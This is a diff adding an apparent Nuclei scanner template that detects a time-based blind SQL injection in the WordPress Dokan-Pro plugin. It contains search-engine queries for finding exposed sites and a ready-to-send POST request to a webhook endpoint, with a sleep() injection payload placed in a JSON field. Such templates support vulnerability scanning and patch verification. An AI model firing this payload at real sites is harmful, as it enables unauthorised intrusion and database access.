@@ -1,0 +1,33 @@
+id: WordPress_Dokan-Pro_SQLi
+
+info:
+  name: WordPress_Dokan-Pro_SQLi
+  author: HK
+  severity: high
+  description: WordPress Dokan-Pro插件存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/wp-content/plugins/dokan-pro/"
+    Hunter-query: body="/wp-content/plugins/dokan-pro/"
+    Quake-query: body="/wp-content/plugins/dokan-pro/"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:21.0) Gecko/20100101 Firefox/21.0
+    Connection: close
+    Accept-Encoding: gzip
+    Content-Length: 121
+
+    {"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep(4))x )='"}}
+
+  redirects: true
+  matchers-condition: and
+  matchers:
+    - type: dsl
+      dsl:
+        - 'duration >= 4'
